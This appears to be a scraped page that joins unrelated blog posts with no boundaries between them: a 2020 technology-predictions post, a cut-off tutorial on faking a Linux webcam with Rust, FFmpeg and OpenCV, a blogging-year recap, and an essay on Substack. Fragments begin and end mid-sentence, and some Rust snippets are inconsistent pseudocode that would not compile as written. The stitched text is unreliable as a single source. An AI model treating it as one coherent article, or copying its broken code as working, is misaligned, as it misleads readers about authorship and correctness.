  <span>response</span> <span>=</span> <span>decode!</span><span>(</span><span>message</span><span>)</span>
  <span>caller_process</span> <span>=</span> <span>KVStore</span><span>.</span><span>fetch</span><span>(</span><span>re…</span></code></pre></div></div></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="post">
  

<p><em>December 2020</em></p>

<p>This post is mostly a brain dump for myself to keep me accountable, and here is
why.</p>

<p>Over the years, I have witnessed brand new technologies or products to be
invented, become mainstream and change lives of millions of people.</p>

<p>Even though I participated in most of those things one way and another, I
started to feel that I didn’t take enough risks that was parallel to what I
believed in.</p>

<p>To be honest, I have taken risks; I have started projects that turned in to
companies, moved to a foreign country etc. However For some reason, I’m
noticing a disconnect between the risks I took and the future I believed in.</p>

<p>This is why I want to materialize what I believe in via this posts, so that
next decade of my life, I can keep myself accountable. I plan to do this every
5 to 10 years.</p>

<h2 id="waves-of-change">Waves of Change</h2>

<p>Some of the things I will list in this post could be too broad however I
believe that there is actually a logical reason behind it.</p>

<p>I think the changes that affect our lives happen in multiple phases and
they built upon each other and progress.</p>

<p>For example, working from home can be the first wave of change and It
eventually leads people to leave big cities and move in to bigger houses, which
leads to a education system going online.</p>

<p>In this post, I will usually mention the first phase. Second phase can be
really hard to guess or rather variable depending on many other factors.</p>

<h2 id="technology-vs-application">Technology vs Application</h2>

<p>This first/second wave concept can also be called technology vs the
application.</p>

<p>Back in Its earlier days, It could be somewhat easier to guess that the
internet would change our lives.</p>

<p>However trying to figure out what might be the reason that people use internet
could be a harder question to answer and depends on many variables.</p>

<p>For example, while e-mail is the natural progression from sending physical
mails; 20-years later the application that uses internet could be a real-time
video conferencing technology.</p>

<p>Usually, the application is what makes the biggest impact on our lives, however
one should be open to different applications since believing in one application
of the technology might result on missing other opportunities within the
technology.</p>

<h2 id="virtual--mixed-reality">Virtual / Mixed Reality</h2>

<p>First time I put oclus on, I couldn’t stop thinking about what might be
possible, and how much better it could get.</p>

<p>It is even more exciting when the technology works and you can find 20 other
things that can be improved.</p>

<p>These headsets are chunky, some of them require cables, they are much slower
compared to mobile computers, and they are doing a terrible job doing mixed
reality.</p>

<p>However, even with it’s current form It’s an incredible experience, which is
why I believe virtual reality to become better and better every year.</p>

<p>Eventually, I believe that these are going to replace our personal computers,
phones and tablets.</p>

<p>As someone spending most of my time looking at monitors, I would love to go for
a walk outside while still checking out things I want to check out without
taking my phone out.</p>

<p>Even with current virtual desktop applications on VR headsets, you can get
multiple monitors and a working physical keyboard, It can easily replace home
office setups.</p>

<p>Combining all this with the remote work phase we will go through, will make
this technology grow exponentially.</p>

<h2 id="virtual-currency">Virtual Currency</h2>

<h3 id="why-crypto-currency">Why Crypto Currency</h3>

<p>Some times It is hard to tell why a specific innovation would replace the
current way of doing things, in those situations I try to imaging the very far
future.</p>

<p>In case of crypto currency, I imagine a future in which we have colonized other
planets.</p>

<p>How would you transfer wealth between different
governments/corporations/individuals between different planets?</p>

<p>Do you think we would try to ship tons of gold or cash? My answer is no.</p>

<p>When It comes near-future It could be harder to argue for life chaining
innovations, however think about 100 years from now.</p>

<h3 id="crypto-currency-adaption">Crypto Currency Adaption</h3>

<p>I have a single measure of adoption for virtual or crypto currencies, whenever
someone asks me about the adoption I mention this.</p>

<p>Adoption will grow until every major bank has a crypto currency wallet that you
can hold your digital assets.</p>

<p>Until this happens, or the banks we know as usual dies (they would rather adopt
a new technology then die) crypto currency space will grow and gain more users.</p>

<h2 id="remote-work">Remote Work</h2>

<p>With the current environment we live in in 2020, It is already pretty hard to
argue against the remote work already.</p>

<p>I believe that we went through different stages of work. These could be
simplified as:</p>

<ol>
  <li>Farming</li>
  <li>Manufacturing</li>
  <li>Knowledge - Office Work</li>
  <li>Remote work</li>
</ol>

<p>Unfortunately, not every part of the country or not every country can move to
the later stages, depending on their current progress some might end up being
stuck, so this one will have very different timeline for each country.</p>

<p>While in California, working from home is already the new normal for the most
tech companies, talking to my friends and family in Istanbul (which relies
mostly on manufacturing and service industry), remote work is still very
foreign.</p>

<p>I believe that remote work now enables world population to freely work for any
company, which will change many things.</p>

<p>It will be harder for local companies to hire good people, since employees will
be able to work for an international company that can afford a much higher pay.</p>

<p>On the other hand, the money that is earned will stay and will circulate the
local economies when that remote worker orders food or pays for rent.</p>

<p>Overall, remote work offers better opportunity for everyone regardless of their
location.</p>

<p>On the other hand, I think immigration will be less of a discussion especially
in the U.S. politics and many other countries, which wasn’t the case for last
10-20 years.</p>

<p>The remote work itself is already happening, but the main question is the
second wave of this change.</p>

<p>Remote education or distance learning is inevitable result of this as well. If
they will never go to an office, why would students ever go to classrooms
anyways.</p>

<p>With our current education system, social education is part of learning which
both happens in a school, but with distance learning I believe that social life
of students and their learning will happen separately.</p>

Zoom calls.</p>

    </span></span></p>
<p>That's me on Zoom, attempting to do what everyone else was doing these days:
messing around with their webcam. Trying to have some fun during those remote
calls that filled your entire calendar now that you've gone full remote.</p>
<p>I could think of three reasons for Zoom's virtual background feature not working
for me:</p>
<ol>
<li>My webcam isn't that good. Too much noise in the input;</li>
<li>My background is awful, filled with visual noise, and with a color that's
probably too close to my own skin;</li>
<li>Linux. We're often the underdogs when it comes to support from proprietary
software.</li>
</ol>
<p>A sensible person would move on with his life. Or maybe buy a better webcam.</p>
<p>A sensible person would not go:</p>
<blockquote>
<p>Oh, I used to study computer graphics! This looks like a fun side-project</p>
<p>Me, first days of quarantine</p>
</blockquote>
<p>This felt like a good excuse to play around with
<a href="https://www.rust-lang.org/" target="_blank" rel="nofollow noopener noreferrer">Rust</a>, but most of all, to finally learn how to use
<a href="https://ffmpeg.org/" target="_blank" rel="nofollow noopener noreferrer">FFmpeg</a>.</p>
<h2>FFmpeg</h2>
<p>This is an open source library for multimedia processing. It's likely you
stumbled upon it at some point, particularly if you googled something like "how
to convert video format".</p>
<p><code>ffmpeg</code> itself is a command line tool that provides an entire toolkit to
process video/audio streams. A few examples:</p>
<div data-language="bash"><pre><code>
$ ffmpeg -i input.mkv -vf <span>scale</span><span>=</span>1280x720 output.mkv



$ ffmpeg -i input.mp4 output.mkv


$ ffmpeg -f v4l2 -framerate <span>25</span> -video_size 640x480 <span>\</span>
  -i /dev/video0 -t 00:00:10 output.mkv</code></pre></div>
<p>Under the hood, FFmpeg include libAV, which is the API that allows you to do all
of this stuff, and much more, programatically.</p>
<p>So my overall idea was:</p>
<ul>
<li>Create a fake webcam on my system (something like <code>/dev/video1</code> instead
of <code>/dev/video0</code>, which points to my real one);</li>
<li>Use FFmpeg to read the input from my webcam;</li>
<li>That output would go through an magic video processing box that I'll somehow build;</li>
<li>Use the resulting video as the feed from my fake webcam;</li>
<li>Learn something along the way.</li>
</ul>
<p><strong>Spoiler alert</strong>: The video processing yielded some results, just not as good
as I had hoped for.</p>
<h2>Faking a webcam</h2>
<p>As it turns out, this is a fairly easy thing to do, in Linux at least. The way
devices are registered in the system is friendly towards these kinds of
hacks.</p>
<p>Video devices in Linux are commonly handled by a set of drivers called V4L2
(remember the <code>-f v4l2</code> flag in the example above?).</p>
<p>And someone had already published a kernel module that can be used to create
virtual devices compatible with V4L2: <a href="https://github.com/umlaeute/v4l2loopback" target="_blank" rel="nofollow noopener noreferrer">v4l2loopback</a></p>
<p>With this module, creating a fake webcam is as easy as:</p>
<div data-language="bash"><pre><code>$ <span>sudo</span> modprobe v4l2loopback <span>devices</span><span>=</span><span>1</span> <span>\</span>
  <span>video_nr</span><span>=</span><span>2</span> <span>card_label</span><span>=</span><span>"Fake"</span> <span>exclusive_caps</span><span>=</span><span>1</span></code></pre></div>
<p>My system actually has two default video devices. So <code>video_nr=2</code> is because
I actually need to create <code>/dev/video2</code> instead. Which is what happened:</p>
<div data-language="bash"><pre><code>$ v4l2-ctl --list-devices
Fake <span>(</span>platform:v4l2loopback-000<span>)</span>:
        /dev/video2

UVC Camera <span>(</span>046d:0825<span>)</span> <span>(</span>usb-0000:2a:00.3-1.4<span>)</span>:
        /dev/video0
        /dev/video1</code></pre></div>
<h2>Feeding the fake device</h2>
<p>Once you have that device running, you may notice it doesn't show up in your
browser.
That's because there's no actual video feed coming from it. What would your
browser show?</p>
<p>So let's debug that quickly with <code>ffmpeg</code>, just to make sure we can get this
layer to work. We can prototype things with the CLI tool before commiting to
implementing a whole program using libav.</p>
<div data-language="bash"><pre><code>ffmpeg <span>\</span>
  -re <span>\</span> 
  -i pickle-rick.mkv <span>\</span> 
  -vcodec rawvideo <span>\</span> 
  -pix_fmt yuv420p <span>\</span> 
  -framerate <span>25</span> <span>\</span>
  -f v4l2 /dev/video2</code></pre></div>
<p>And my browser is now able to consume <code>/dev/video2</code> correctly.</p>

<p>I can even do a test with my actual webcam, and include a simple filter, such as

<p>Ok, this was fun. Let's now port this over to actual code...</p>
<h2>The Code</h2>
<p>Part of the challenge on the Rust side of things is the fact that libAV is
a C API, and an outdated one at that. Much of the goodness we're used to
with modern languages isn't available. Things such as error handling and
debugging become are closer to a black art than I'd prefer.</p>
<p>The existing FFI wrappers for ffmpeg (such as the <a href="https://crates.io/crates/ffmpeg4-ffi" target="_blank" rel="nofollow noopener noreferrer">one I'm using</a>)
do a decent job at providing a more Rust-like interface, but due to weak typing
of some of the functions, it can only go so far:</p>
<div data-language="rust"><pre><code><span>use</span> std<span>::</span>ffi<span>::</span><span>{</span>CString<span>}</span><span>;</span>
<span>use</span> ffmpeg4_ffi<span>::</span>sys<span>::</span><span>{</span>AVFormatContext<span>,</span> av_guess_format<span>}</span><span>;</span>
<span>use</span> std<span>::</span>ptr<span>::</span><span>{</span>null<span>,</span> null_mut<span>}</span><span>;</span>

<span>let</span> <span>mut</span> context<span>:</span> <span>*</span><span>mut</span> AVFormatContext <span>=</span> <span>null_mut</span><span>(</span><span>)</span><span>;</span>

<span>let</span> format <span>=</span> <span>unsafe</span> <span>{</span>
  <span>av_guess_format</span><span>(</span>
    CString<span>::</span><span>new</span><span>(</span><span>"v4l2"</span><span>)</span><span>.</span><span>unwrap</span><span>(</span><span>)</span><span>,</span>
    <span>null</span><span>(</span><span>)</span><span>,</span>
    <span>null</span><span>(</span><span>)</span>
  <span>)</span>
<span>}</span></code></pre></div>
<p>This is what most calls to libAV look like. Strings need to be converted to
their C representation (null-terminated arrays of characters). Pointers need to
be allocated separately and passed around as mutable arguments. And yes, pretty
much everything is <code>unsafe</code>, since we're dealing with raw pointers.</p>
<p>With all that in mind, I won't bore you with all the details of the code for
this layer. But it's all isolated (and somewhat readable) in the two modules
where I abstracted this behaviour to:</p>
<ul>
<li><a href="https://github.com/naps62/instacam/blob/master/src/av/encoder_ctx.rs" target="_blank" rel="nofollow noopener noreferrer"><code>DecoderCtx</code></a>: Connects to a video source, and provides an interface to read video frames from it. The analog to the <code>-f v4l2 -framerate 25 -video_size 640x480 -i /dev/video0</code> part of the CLI commands;</li>
<li><a href="https://github.com/naps62/instacam/blob/master/src/av/encoder_ctx.rs" target="_blank" rel="nofollow noopener noreferrer"><code>EncoderCtx</code></a>: The opposite end of the pipeline, where processed frames are encoded again and written to an output video feed (<code>-vcoded rawvideo -pix_fmt yuv420p -f v4l2 /dev/video2</code>);</li>
</ul>
<p>With that in mind, we can write a more high-level program that pipes the input
feed to the output:</p>
<div data-language="rust"><pre><code><span>use</span> ffmpeg4_ffi<span>::</span>sys<span>;</span>

<span>let</span> <span>mut</span> decoder <span>=</span> DecoderCtx<span>::</span><span>new</span><span>(</span><span>&amp;</span>settings<span>)</span>
<span>let</span> <span>mut</span> encoder <span>=</span> EncoderCtx<span>::</span><span>new</span><span>(</span><span>&amp;</span>settings<span>,</span> <span>&amp;</span>decoder<span>)</span>

# allocate two frames
<span>let</span> input<span>:</span> <span>*</span><span>mut</span> sys<span>::</span>AVFrame <span>=</span> <span>unsafe</span> <span>{</span> sys<span>::</span><span>av_frame_alloc</span><span>(</span><span>)</span> <span>}</span><span>;</span>
<span>let</span> output<span>:</span> <span>*</span><span>mut</span> sys<span>::</span>AVFrame <span>=</span> <span>unsafe</span> <span>{</span> sys<span>::</span><span>av_frame_alloc</span><span>(</span><span>)</span> <span>}</span><span>;</span>

<span>loop</span> <span>{</span>
  decoder<span>.</span><span>decode_frame</span><span>(</span><span>&amp;</span>input<span>)</span><span>;</span>

  <span>do_stuff</span><span>(</span><span>&amp;</span>input<span>,</span> <span>&amp;</span>output<span>)</span><span>;</span>

  encoder<span>.</span><span>encode_frame</span><span>(</span><span>&amp;</span>output<span>)</span><span>;</span>
<span>}</span></code></pre></div>
<p>Now within <code>do_stuff</code> we can do whatever we want with the given image. We just
need to ensure the output image is encoded in the correct format (the one
expected by out encoder, <code>yuv420p</code> in my case) and resolution.</p>
<p>This also can, and probably should, be parallelized in some way.
Ideally, frames should be read at a constant rate, equal to the desired
framerate, and processed asynchronously. The processing done by <code>do_stuff</code> and
the encoding itself take considerable time. If the image is large enough, or if
<code>do_stuff</code> is actually doing a lot of stuff, its easy for the framerate of your
output to drop as a consequence. For this purpose
though, we're not getting into that (perhaps a later post).</p>
<p>Now on to editing the image.</p>
<h2>OpenCV</h2>
<p>This one gives me a few bad memories from back when I was a student, but its
still one of the obvious candidates image processing libraries.</p>
<p>Now that we have a frame isolated, there's still one step left before being able to process them with OpenCV.</p>
<h3>Pixel format conversion</h3>
<p>Raw frames come in <a href="https://en.wikipedia.org/wiki/YUV" target="_blank" rel="nofollow noopener noreferrer">YUV format</a> which store <em>luma</em> (how bright a pixel
is) in the Y channel and <em>chroma</em> (what color it is) in U and V channels.
OpenCV needs images to be in <code>BGR</code> format, with 3 color channels.</p>
<p>For that, we also need to use <code>libswscale</code> which is part of the FFmpeg package,
and handles conversions between pixel format conversions:</p>
<div data-language="rust"><pre><code># we need <span>4</span> frames now
<span>let</span> input_yuv <span>=</span> sys<span>::</span><span>av_frame_alloc</span><span>(</span><span>)</span><span>;</span>
<span>let</span> input_bgr <span>=</span> sys<span>::</span><span>av_frame_alloc</span><span>(</span><span>)</span><span>;</span>
<span>let</span> output_bgr <span>=</span> sys<span>::</span><span>av_frame_alloc</span><span>(</span><span>)</span><span>;</span>
<span>let</span> output_yuv <span>=</span> sys<span>::</span><span>av_frame_alloc</span><span>(</span><span>)</span><span>;</span>

<span>let</span> BGR<span>:</span> <span>=</span> sys<span>::</span>AVPixelFormat_AV_PIX_FMT_BGR24<span>;</span>
<span>let</span> YUV<span>:</span> <span>=</span> sys<span>::</span>AVPixelFormat_AV_PIX_FMT_YUVJ420P<span>;</span>

# sws
<span>let</span> yuv2bgr_context <span>=</span> sys<span>::</span><span>alloc_sws</span><span>(</span>width<span>,</span> height<span>,</span> YUV<span>,</span> BGR<span>)</span>
<span>let</span> bgr2yuv_context <span>=</span> sys<span>::</span><span>alloc_sws</span><span>(</span>width<span>,</span> height<span>,</span> YUV<span>,</span> BGR<span>)</span>

<span>loop</span> <span>{</span>
  decoder<span>.</span><span>decode_frame</span><span>(</span><span>&amp;</span>input_yuv<span>)</span><span>;</span>

  # convert input frame to RGB
  sys<span>::</span><span>sws_convert</span><span>(</span>yuv2bgr_context<span>,</span> input_yuv<span>,</span> input_bgr<span>)</span>

  <span>do_stuff</span><span>(</span><span>&amp;</span>input_bgr<span>,</span> <span>&amp;</span>output_rgb_frame<span>)</span><span>;</span>

  # convert processed RGB frame back into YUV
  sys<span>::</span><span>sws_convert</span><span>(</span>bgr2yuv_context<span>,</span> output_rgb<span>,</span> output_yuv<span>)</span>

  encoder<span>.</span><span>encode_frame</span><span>(</span><span>&amp;</span>output_yuv<span>)</span><span>;</span>
<span>}</span></code></pre></div>
<h3>Blurring</h3>
<p>As a simple example, let's say we want our <code>do_stuff</code> function to blur the input
image. With all the encoding &amp; conversion work out of the way, that is now
a simple task:</p>
<div data-language="rust"><pre><code><span>use</span> opencv<span>::</span>imgproc<span>;</span>
<span>use</span> opencv<span>::</span>core<span>::</span><span>{</span>BorderTypes<span>,</span> Point<span>,</span> Size<span>}</span><span>;</span>

<span>fn</span> <span>do_stuff</span><span>(</span><span>*</span><span>mut</span> sys<span>::</span>AVFrame input<span>,</span> <span>*</span><span>mut</span> sys<span>::</span>AVFrame output<span>)</span> <span>{</span>
    <span>let</span> src <span>=</span> <span>cast_frame_to_mat</span><span>(</span>input<span>)</span><span>;</span>
    <span>let</span> <span>mut</span> dst <span>=</span> <span>cast_frame_to_mat</span><span>(</span>output<span>)</span><span>;</span>

    imgproc<span>::</span><span>blur</span><span>(</span>
        <span>&amp;</span>src<span>,</span>
        <span>&amp;</span><span>mut</span> dst<span>,</span>
        Size<span>::</span><span>new</span><span>(</span><span>64</span><span>,</span> <span>64</span><span>)</span><span>,</span>
        Point<span>::</span><span>new</span><span>(</span><span>-</span><span>1</span><span>,</span> <span>-</span><span>1</span><span>)</span><span>,</span>
        BorderTypes<span>::</span>BORDER_CONSTANT <span>as</span> i32<span>,</span>
    <span>)</span>
    <span>.</span><span>unwrap</span><span>(</span><span>)</span><span>;</span>

    <span>self</span><span>.</span>out
<span>}</span></code></pre></div>
<p>Notice we need use <code>frame_to_mat</code> to convert FFmpeg frames to OpenCV's structs.
The underlying data buffers aren't touched, so this isn't an expensive
operation. The implementation is available <a href="https://github.com/naps62/instacam/blob/master/src/filters/utils.rs" target="_blank" rel="nofollow noopener noreferrer">here</a> for those
interested in the details.</p>
<p>Since OpenCV already provides functions for standard operations, we just need to
call <a href="https://docs.rs/opencv/0.46.3/opencv/imgproc/fn.blur.html" target="_blank" rel="nofollow noopener noreferrer"><code>imgproc::blur</code></a> to tie it all together2:</p>

      </picture>
    </span></span></p>
<h2>Multiple filters</h2>
<p>The final version is a bit more complex than the code shown above, because it
allows piping multiple filters in a pipeline, by simply configuring a JSON file:</p>
<div data-language="json"><pre><code>  <span>"input"</span><span>:</span> <span>"/dev/video0"</span><span>,</span>
  <span>"output"</span><span>:</span> <span>"/dev/video2"</span><span>,</span>
  <span>"width"</span><span>:</span> <span>1280</span><span>,</span>
  <span>"height"</span><span>:</span> <span>720</span><span>,</span>
  <span>"fps"</span><span>:</span> <span>30</span><span>,</span>
  <span>"pipeline"</span><span>:</span> <span>[</span>
    <span>{</span>
      <span>"name"</span><span>:</span> <span>"blur"</span><span>,</span>
      <span>"k"</span><span>:</span> <span>64</span>
    <span>}</span><span>,</span>
    <span>{</span>
      <span>"name"</span><span>:</span> <span>"sepia"</span>
    <span>}</span>
  <span>]</span></code></pre></div>

<p>This is only the groundwork for more useful features. Being able to decouple
filters allows us to mount them together like Legos. One filter can run
a <a href="https://github.com/naps62/instacam/blob/master/src/filters/bgsub.rs" target="_blank" rel="nofollow noopener noreferrer">background subtraction algorithm</a>, and a subsequent filter can apply
an effect to the remaining empty space.</p>
<p>However, it seems the limitations I mentioned at the beginning also …</p></div></div></div></div></div></div></section></article></div></div></div>

<p>This is the story of how I started my blog, reached the HackerNews front page and spoke at a conference and how one childhood experience was in the way of it all.</p>



<p>One of my personal goals for 2020 was to release one side project. While contemplating ideas I stumbled upon an article which highlighted why you should start ideas out of your core domain. So I dismissed my half-baked SaaS ideas and went for a no-code idea instead: Start a blog. If you just came for the stats you can <a href="#stats">scroll to the bottom</a>. If you’re in for the recap just read on.</p>



<h2>Just ship it</h2>



<p>My first article went online on January 29. Pretty early to meet one of my yearly goals I must admit. I can assure you I managed to miss many other low hanging fruits like running a sub 3 marathon. However, I did manage to release 22 more blog posts which makes up for that a bit.</p>



<figure><img src="https://andreschweighofer.com/wp-content/uploads/2020/12/stepbystep-1024x546.jpg" alt="" srcset="https://andreschweighofer.com/wp-content/uploads/2020/12/stepbystep-1024x546.jpg 1024w, https://andreschweighofer.com/wp-content/uploads/2020/12/stepbystep-300x160.jpg 300w, https://andreschweighofer.com/wp-content/uploads/2020/12/stepbystep-768x410.jpg 768w, https://andreschweighofer.com/wp-content/uploads/2020/12/stepbystep.jpg 1200w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>The first “hit” I had was <a href="https://www.runtastic.com/blog/en/no-more-estimates/">an article released for my employer</a>, Runtastic about #noEstimates. It was recognised by some big names I look up to like Allen Holub. I was also invited to a podcast. This was all still in the first quarter of the year. The positive responses were fuel to the fire of my writing.</p>



<h2>Five minutes of fame</h2>



<p>My blog still averaged less than 10 daily visitors. I experimented with different kinds of articles, like my <a href="https://andreschweighofer.com/today-i-learned/my-tils-of-the-week-14-20/">TILs of the week</a>. Then I hit the next golden nugget. <a href="https://andreschweighofer.com/agile/anxiety-in-product-development/">Anxiety in product development</a> made it to the #1 spot on HackerNews for a full day. This generated about 40.000 page views which to this day is about 90% of my total page views in the year. But this was much more personal. I’m an avid HackerNews reader since my early days of university. That’s now almost 10 years ago. It feels like my first (and only) StackOverflow gold badge.</p>



<p>It also came with an even bigger lesson: Be less judgmental about your writing. I was not planning to publish the article at first because I thought it was too weak. It gets me wondering how many of my self-censored articles would’ve been perceived positively as well.</p>



<h2>The speech</h2>



<p>My next two articles about <a href="https://andreschweighofer.com/agile/crafting-a-lean-roadmap/">lean roadmaps</a> had a wide reach since they were featured in some newsletters. After that my writing slowed down considerably because I was preparing for my first ever conference talk. At the Lean Agile Exchange I shared my team’s experience with #noEstimates. While it did not make me famous (not as famous as the HackerNews front page anyway) it really pushed me out of my comfort zone and made me hone some new skills. I’m definitely planning to look for another speaking opportunity next year, maybe <a href="https://andreschweighofer.com/tech/technical-debt-is-an-organisational-dysfunction/">about technical debt</a>.</p>



<h2>My lessons learned</h2>



<p>It was a year of many firsts. Those brought a lot of learning opportunities for me.</p>



<h3>A viscious learning cycle</h3>



<p>You think you got your ideas straight until you write them down. While writing you find inconsistencies and holes in the story. This lead me to read more than I ever did. The more I read the more I wanted to write about ideas I had while reading. That’s why I can’t leave the most influental books for me unmentioned.</p>



<ul><li><a href="https://www.amazon.com/gp/product/2960133552/ref=as_li_tl?ie=UTF8&amp;camp=1789&amp;creative=9325&amp;creativeASIN=2960133552&amp;linkCode=as2&amp;tag=andre0d6f-20&amp;linkId=8b675f3ba120ae8f5e3edff39608cabe">Reinventing Organisations</a> – This book had the biggest impact on me because I found the <em>Integral Theory</em> applicable to all aspect of my life – work, parenting, thinking. Here’s one of my favourite quotes from the book:</li></ul>



<blockquote><p>Our underlying management paradigm today is based on trying to predict and control. And the challenge with that: it often gives us more illusion of control than real control.</p></blockquote>



<ul><li><a href="https://www.amazon.com/gp/product/1984877860/ref=as_li_tl?ie=UTF8&amp;tag=andre0d6f-20&amp;camp=1789&amp;creative=9325&amp;linkCode=as2&amp;creativeASIN=1984877860&amp;linkId=0c6997a715595b76b3a7397405d06f7c"></a><a rel="noreferrer noopener" target="_blank" href="https://www.amazon.com/gp/product/1984877860?ie=UTF8&amp;tag=andre0d6f-20&amp;camp=1789&amp;linkCode=xm2&amp;creativeASIN=1984877860">No Rules Rules: Netflix and the Culture of Reinvention</a> – A captivating read about Netflix’s polarising but very successful culture. Their thoughtful approach to giving and receiving feedback and how they value people over processes was interesting.</li><li><a rel="noreferrer noopener" target="_blank" href="https://www.amazon.com/gp/product/1603580557?ie=UTF8&amp;tag=andre0d6f-20&amp;camp=1789&amp;linkCode=xm2&amp;creativeASIN=1603580557">Thinking in Systems: A Primer</a> – While this was really not more than a basic introduction to systems thinking I enjoyed the more opinionated second half of the book. Here’s a quote to give you a taste:</li></ul>



<p><em>“It requires freedom and experimentation, and a certain amount of disorder. These conditions that encourage self-organization often can be scary for individuals and threatening to power structures. As a consequence, education systems may restrict the creative powers of children instead of stimulating those powers. Economic policies may lean toward supporting established, powerful enterprises rather than upstart, new ones. And many governments prefer their people not to be too self-organizing.”</em></p>



<ul><li><a rel="noreferrer noopener" target="_blank" href="https://www.amazon.com/gp/product/3903205397?ie=UTF8&amp;tag=andre0d6f-20&amp;camp=1789&amp;linkCode=xm2&amp;creativeASIN=3903205397">Rethinking Agile: Why Agile Teams Have Nothing To Do With Business Agility</a> Do your organisation’s high-level goals feel completely disconnected from your daily work? Then you should read this book to see that it can be different.</li></ul>



<h2>Finding your voice</h2>



<p>It’s incredibly hard to find your own voice. I think I still haven’t found it. I would like to <a href="https://mango.pdf.zone/finding-former-australian-prime-minister-tony-abbotts-passport-number-on-instagram">write like MangoPDF</a> but am afraid of sounding like an idiot or losing non-native audiences. With my current rate I can’t afford to lose any visitors really.</p>



<p>Ultimately the most important thing for me is to get the idea across, not to be perceived as witty. I still feel vulnerable publishing and promoting my own writing and I am somewhat held back by exposing my full self. How do you find a balance between writing what is interesting to others and what you want to say?</p>



<h2>The joy of writing</h2>



<p>I rediscovered something I didn’t even remember I lost. I love writing. As a child I spent hours in my room writing fiction even though there was a Nintendo competing for my attention. However, being laughed at while presenting my work made that 9 year old simply stop writing. It only came back to me once I did pick up writing again how much I enjoyed the act in itself. Every word I publish still fights this criticism. It also gave me a profound reminder of how sensitive I want to be with my children’s creativity.</p>



<h2 id="stats">The raw data</h2>



<p>If you’re just curious how this blog did, here are my numbers:</p>



<ul><li>I published in total 22 articles</li><li>I generated just above 43.000 <em>pageviews.</em> 90% of that were from HackerNews with <a href="https://andreschweighofer.com/agile/anxiety-in-product-development/">Anxiety in product development</a>.</li><li>The <em>average</em> <em>time on page</em> is just short of 4 minutes. I love that fact because it means people actually read my stuff.</li><li>I had 8.000 search impressions with 136 clicks with an average search position of 22. My best performing SEO article is: <a href="https://andreschweighofer.com/tech/how-to-measure-technical-debt/">How to measure technical debt</a>.</li></ul>



<h2>An outlook for 2021</h2>



<p>I definitely want to continue to write. The plan is to use some of that as the basis for a conference talk. At the same time I want to continue doing the Experiential Agile podcast with Mel. I will start a new role as Engineering Manager early next year which could either fuel my writing with new ideas and problems but it could also take time and energy away from my writing. We will see.</p>

<p>Writing is hard, competitive, and readers do not want to pay for it. Sounds like an unappealing market right? Against all odds, Substack is one of the most hyped companies at the moment. Their competitive advantage, growing and monetizing newsletters simply, is also a weakness. Writers can just as easily leave with a list Substack helped them grow and monetize.</p>



<p>Substack’s incentives are aligned for smaller writers (can’t beat free) but become misaligned for larger ones. For writers, Substack is as good as the services they provide them lately. The beneficial features for a new writer with no following are not the same as the features for an experienced writer with a large following. Larger writers might need support with moderation, subscriber management, promotion, and protection.</p>



<p>Why would writers leave? Substack takes a 10% cut of subscriptions. This isn’t much for smaller writers but is significant optionality for larger ones. At large amounts, writers could find ways to claim more of that cut for themselves, while getting optionality. Examples of this are paying someone to develop, host, and manage their own site, finding a service to do it cheaper with customization, or monetizing through traditional routes (books and institutions). Margin is opportunity.</p>



<p>Money isn’t the only reason for writers leaving. Newsletters require new content to constantly be created. You can’t charge someone for nothing. If someone wants to focus on any other medium (book, video, podcast, writing for an institution), it is a loss to Substack.</p>



<p>Keeping big writers writing on Substack is a key business problem to figure out. Here’s how they do it:</p>



<ol><li>Providing an expanded definition of customer service.</li><li>Building community and reader lock-in.</li><li>Showing writers how bad leaving would be.</li></ol>



<h3>Expanded Definition of Customer Service</h3>



<p>Incentives become misaligned for high revenue writers. Revenue from a writer increases but the value provided to that writer stays the same. Writers could perceive Substack as not providing value at high revenue levels. To realign incentives, Substack needs to provide an extended definition of customer service.</p>



<p>Substack should aim to remove toil from writers. Toil is any work not central to writing the newsletter. Examples of this include moderation, payments, refunds, and product improvements. These are all tasks writers do for themselves away from Substack or get handled for them in an organization.</p>



<p>Substack needs to find a balance between providing services to writers and allowing independence. An example of this is <a href="https://blog.substack.com/p/legal-support-for-substack-writers" target="_blank" rel="noreferrer noopener">Substack’s legal “Defender” program</a>. It provides the benefits of a larger organization (legal support if needed) while allowing writers to remain independent.</p>



<p>Research and promotion are two ambitious areas to remove toil that could create massive competitive advantages. Substack could provide access to key research subscriptions to its writers. They could also co-market with writers to boost sign-ups and subscriptions.</p>



<p>Substack must treat its writers as large enterprise contracts. Substack enables writer success. This requires more than customer support reps answering questions. It cuts into their margins but is necessary as competitors encroach.</p>



<h3>Community</h3>



<p>Writers may own the email list but they don’t own the full reader relationship. Substack will own more of the relationship. Product design is limited if in the end an email is sent. Moving readers from their email inbox to Substack’s site is an important goal.</p>



<p><a rel="noreferrer noopener" href="https://inbox.substack.com/" target="_blank">“Substack Inbox” is in Beta</a>. Its goal is readers reading on Substack’s site. This enables better community engagement and discovery. Inbox creates a closer relationship between readers and Substack. Substack wants readers to lock into the platform. They want to be the place readers check when they are looking for something to read.</p>



<p>Time-on-site creates value for Substack as a community. While on-site, people are more likely to see comments and more likely to comment. Communities require engagement to grow, and email is a low engagement platform. Substack provides access to many “communities” using one login. With engagement, community becomes a reason for readers to use Substack.</p>



<p>For writers, reader lock-in means less potential readership if they move away. Moving away may mean losing out on the community engagement and discovery Substack provides. If moving away from Substack means losing a large potential audience and community, that becomes an incentive to stay.</p>



<p>This could also be true in the other direction. Writers could want to move away from Substack for greater control over their community. Without careful moderation (who provides it?), communities can get out of control, especially because of the popularity of politics on the platform. Trolls go where the attention goes.</p>



<p>If Substack succeeds in getting readers to spend more time-on-site, there are incentives for writers to stay. If a writer moves, they’ll lose some part of their readership who spends time on Substack’s site and in their communities. Substack can say “don’t leave, your readers are all here.”</p>



<h3>Showing Writers How Bad Leaving Would Be</h3>



<p>Many of the most popular writers left traditional writing gigs to join Substack. This is great marketing for Substack. They must play this up. The message is simple: “traditional media is evil and managing your own site is too difficult, stay with us.”</p>



<p>I can foresee a day when a writer on Substack writes something bad about traditional media, so bad it is considered slanderous. The media company and the writer get in a legal fight. Substack comes to that writer’s defense. “Big institutions are evil, Substack is good.” Infinite good marketing for Substack.</p>



<p>To keep this up, they must keep the image of enabling independence. There will be big media stories about how Substack is hosting evil people (and it may be true). Big organizations can coordinate their attack and rally their writers to support. Substack needs their writers to decide to support them. If writers turn and Substack’s reaction is bad, this could be a major problem for the business.</p>



